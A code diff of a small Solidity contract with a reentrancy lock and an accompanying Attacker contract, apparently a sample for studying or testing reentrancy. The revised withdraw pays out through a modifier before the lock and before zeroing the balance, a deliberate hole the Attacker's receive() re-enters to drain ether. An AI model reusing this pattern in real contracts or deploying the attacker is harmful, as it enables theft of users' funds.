@@ -1,10 +1,9 @@
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.20;
 
 // SPDX-License-Identifier: GPL-3.0
 contract C {
     bool private flag = false;
     mapping (address => uint256) public balances;
-
 
     modifier nonReentrant() {
         require(!flag, "Locked");
@@ -13,67 +12,20 @@ contract C {
         flag = false;
     }
 
-    modifier Sticazzi(address a, uint256 amt) {
-        //balances[a] += amt;
-        a.call{value:amt}("");
+    modifier sendMoney() {
+        uint amt = balances[msg.sender];
+        require(amt > 0, "Insufficient funds");
+        (bool success, ) = msg.sender.call{value:amt}("");
+        require(success, "Call failed");
         _;
     }
 
-    function withdraw2() Sticazzi(msg.sender, 10) nonReentrant public {
-        msg.sender.call{value:10}("");
-        
-        require(!flag, "Locked");
-        flag = true;
-
-        uint amt = balances[msg.sender];
-        require(amt > 0, "Insufficient funds");
-        (bool success, ) = msg.sender.call{value:amt}("");
-        require(success, "Call failed");
-        balances[msg.sender] = 0;
-
-        flag = false;
-    }
-
-    //
-    //
-    //
-
-    modifier enoughBalance() {
-        uint amt = balances[msg.sender];
-        require(amt > 0, "Insufficient funds");
-        _;
-
-        (bool success, ) = msg.sender.call{value:amt}("");
-        require(success, "Call failed");
-       
-        balances[msg.sender] = 0;
-    }
-
-    function withdraw3() enoughBalance nonReentrant public {
-    }
-
-
-
-
-    // this function is not protected by the modifier
-    // so an attacker can reenter after the external call below and move the amount in balances[msg.sender] to another address (parameter 'to') owned by the attacker
-    // a subsequent invocation of withdraw() performed by 'to' will receive money that the attacker never deposited
-    function transfer(address to, uint256 amt) public {
-        require(balances[msg.sender] >= amt, "Insufficient funds");
-        balances[to] += amt;
-        balances[msg.sender] -= amt;
-    }
-
-    function withdraw() nonReentrant public {
-        uint amt = balances[msg.sender];
-        require(amt > 0, "Insufficient funds");
-        (bool success, ) = msg.sender.call{value:amt}("");
-        require(success, "Call failed");
+    function withdraw() sendMoney nonReentrant public {
         balances[msg.sender] = 0;
     }
 
     function deposit() nonReentrant public payable {
-        balances[msg.sender] += msg.value;       
+        balances[msg.sender] += msg.value;
     }
 
 }
@@ -85,6 +37,7 @@ contract Attacker {
         to = _to;
         c = C(v);
     }
+    
     function attack() public {
         c.deposit{value: 100}();
         c.withdraw();
@@ -92,7 +45,7 @@ contract Attacker {
     }
 
     receive() external payable {
-        withdraw2();
+        c.withdraw();
         // c.transfer(to, 100);
     } 
 }
